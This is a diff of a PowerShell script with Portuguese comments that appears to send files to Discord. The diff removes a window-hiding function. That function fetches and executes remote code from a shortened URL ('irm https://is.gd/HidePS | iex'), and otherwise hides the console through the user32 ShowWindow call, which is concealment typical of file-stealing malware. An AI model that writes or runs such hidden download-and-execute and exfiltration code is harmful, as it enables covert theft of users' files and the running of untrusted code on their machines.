@@ -160,33 +160,6 @@ function Send-FilesToDiscord {
         total = $files.Count
     }
 }
-# ============= OCULTAÇÃO DA JANELA =============
-function Hide-Window {
-    Write-Host "Ocultando a janela..." -ForegroundColor Yellow
-    Start-Sleep 1
-    
-    $v = (Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion').DisplayVersion
-    $y = $v.Substring(0, 2)
-    
-    if ($y -gt 21) {
-        # Windows 11 ou superior
-        try {
-            irm https://is.gd/HidePS | iex
-        }
-        catch {
-            # Fallback: esconder via API
-            $Import = '[DllImport("user32.dll")] public static extern bool ShowWindow(int handle, int state);'
-            add-type -name win -member $Import -namespace native
-            [native.win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0)
-        }
-    }
-    else {
-        # Windows 10 ou inferior
-        $Import = '[DllImport("user32.dll")] public static extern bool ShowWindow(int handle, int state);'
-        add-type -name win -member $Import -namespace native
-        [native.win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0)
-    }
-}
 
 # ============= CORPO PRINCIPAL DO SCRIPT =============
 Clear-Host
